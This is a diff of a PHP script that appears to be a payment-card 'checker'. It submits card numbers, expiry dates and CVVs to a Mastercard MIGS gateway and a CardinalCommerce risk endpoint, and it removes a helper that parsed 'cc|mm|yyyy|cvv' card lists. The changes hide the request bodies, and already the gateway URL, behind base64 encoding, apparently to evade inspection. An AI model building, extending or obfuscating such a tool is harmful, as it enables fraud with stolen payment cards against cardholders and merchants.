@@ -60,7 +60,7 @@ if(($I = json_decode($data))->session) {
   $mgs = rq(base64_decode('aHR0cHM6Ly9taWdzLm1hc3RlcmNhcmQuY29tLmF1L3ZwY3BheQ=='), [
     'header' => 1,
     'followlocation' => 1,
-    'postfields' => "vpc_AccessCode=$vpc_AccessCode&vpc_Amount=$vpc_Amount&vpc_CardExp=$vpc_CardExp&vpc_CardNum=$vpc_CardNum&vpc_CardSecurityCode=$vpc_CardSecurityCode&vpc_Command=pay&vpc_Gateway=ssl&vpc_MerchTxnRef=$vpc_MerchTxnRef&vpc_Merchant=$vpc_Merchant&vpc_OrderInfo=$vpc_OrderInfo&vpc_ReturnURL=".urlencode($vpc_ReturnURL)."&vpc_Version=1&vpc_card=$vpc_card&vpc_SecureHash=$vpc_SecureHash&vpc_SecureHashType=SHA256&vpc_Currency=PHP",
+    'postfields' => base64_decode("dnBjX0FjY2Vzc0NvZGU9JHZwY19BY2Nlc3NDb2RlJnZwY19BbW91bnQ9JHZwY19BbW91bnQmdnBjX0NhcmRFeHA9JHZwY19DYXJkRXhwJnZwY19DYXJkTnVtPSR2cGNfQ2FyZE51bSZ2cGNfQ2FyZFNlY3VyaXR5Q29kZT0kdnBjX0NhcmRTZWN1cml0eUNvZGUmdnBjX0NvbW1hbmQ9cGF5JnZwY19HYXRld2F5PXNzbCZ2cGNfTWVyY2hUeG5SZWY9JHZwY19NZXJjaFR4blJlZiZ2cGNfTWVyY2hhbnQ9JHZwY19NZXJjaGFudCZ2cGNfT3JkZXJJbmZvPSR2cGNfT3JkZXJJbmZvJnZwY19SZXR1cm5VUkw9Ii51cmxlbmNvZGUoJHZwY19SZXR1cm5VUkwpLiImdnBjX1ZlcnNpb249MSZ2cGNfY2FyZD0kdnBjX2NhcmQmdnBjX1NlY3VyZUhhc2g9JHZwY19TZWN1cmVIYXNoJnZwY19TZWN1cmVIYXNoVHlwZT1TSEEyNTYmdnBjX0N1cnJlbmN5PVBIUA=="),
     'httpheader' => [
       'Connection: keep-alive',
       'Cache-Control: max-age=0',
@@ -156,7 +156,7 @@ function comm($opt) {
 
   rq('https://authentication.cardinalcommerce.com/Api/NextStep/ProcessRisk',
     [
-      'postfields' => "TransactionId=$trId&DeviceId=$trId&ProviderType=TM&ProviderId=01zzvc40&IssuerId=$sId&X-Requested-With=XMLHttpRequest&X-HTTP-Method-Override=FORM",
+      'postfields' => base64_decode("VHJhbnNhY3Rpb25JZD0kdHJJZCZEZXZpY2VJZD0kdHJJZCZQcm92aWRlclR5cGU9VE0mUHJvdmlkZXJJZD0wMXp6dmM0MCZJc3N1ZXJJZD0kc0lkJlgtUmVxdWVzdGVkLVdpdGg9WE1MSHR0cFJlcXVlc3QmWC1IVFRQLU1ldGhvZC1PdmVycmlkZT1GT1JN"),
       'httpheader' => [
         'accept: */*',
         'content-type: application/x-www-form-urlencoded; charset=UTF-8',
@@ -241,16 +241,6 @@ function rmf() {
       unlink($value);
     }
   }
-}
-function set_card($card, $validYYYY = 2) {
-  list($cc,$mm,$yyyy,$cvv) = explode('|',$card);
-  $yyyy = strlen($yyyy) === 4 ? ($validYYYY === 2 ? substr($yyyy, 2) : $yyyy) : (strlen($yyyy) === 2 ? ($validYYYY === 4 ?  '20'.$yyyy : $yyyy) : exit('INVALID EXP YEAR'));
-  return [
-    'cc' => $cc,
-    'mm' => $mm,
-    'yyyy' => $yyyy,
-    'cvv' => $cvv
-  ];
 }
 function Receipt($link) {
   !is_dir('receipt') ? shell_exec('mkdir receipt') : NULL;
